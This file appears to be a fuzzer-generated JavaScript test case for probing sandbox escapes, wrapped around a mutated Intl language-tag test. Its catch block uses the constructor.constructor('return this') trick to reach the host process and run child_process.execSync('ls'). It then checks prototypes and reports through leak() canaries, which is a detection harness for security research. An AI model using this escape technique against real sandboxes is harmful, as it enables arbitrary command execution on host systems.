try {
    var validLanguageTags = [
        'de',
        'de-DE',
        'DE-de',
        'cmn',
        'cmn-Hans',
        'CMN-hANS',
        'cmn-hans-cn',
        'es-419',
        'es-419-u-nu-latn-cu-bob',
        'cmn-hans-cn-t-ca-u-ca-x-t-u',
        'de-gregory-u-ca-gregory',
        'aa-a-foo-x-a-foo-bar'
    ];
    testWithIntlConstructors(function (Constructor) {
        let REPLACER = 23;
        validLanguageTags.forEach(function (tag) {
            throw () => {
                return () => {
                };
            };
            var obj = new Constructor([tag]);
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}